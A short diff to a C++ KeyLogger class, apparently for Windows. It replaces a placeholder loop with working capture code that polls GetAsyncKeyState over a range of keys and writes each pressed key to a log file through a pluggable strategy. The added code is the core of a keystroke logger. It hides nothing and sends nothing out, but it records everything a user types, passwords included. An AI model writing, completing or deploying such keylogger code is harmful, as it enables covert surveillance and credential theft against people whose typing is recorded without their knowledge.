@@ -33,6 +33,14 @@ bool KeyLogger::openLogFile(const std::string &filename)
     return this->logfile.is_open();
 }
 
+void KeyLogger::logKey(char key) 
+{
+    if (logStrategy != nullptr) 
+    {
+        logStrategy->log(key, this->logfile);
+    }
+}
+
 void KeyLogger::start()
 {
     running = true;
@@ -40,7 +48,14 @@ void KeyLogger::start()
 
     while(running)
     {
-        // need to think
+        for(key = START_KEY; key <= END_KEY; ++key)
+        {
+            if(GetAsyncKeyState(key) == IS_PRESSED)
+            {
+                this->logKey(key);
+            }
+        }
+        Sleep(PAUSE); // reduce CPU usage
     }
 }
 
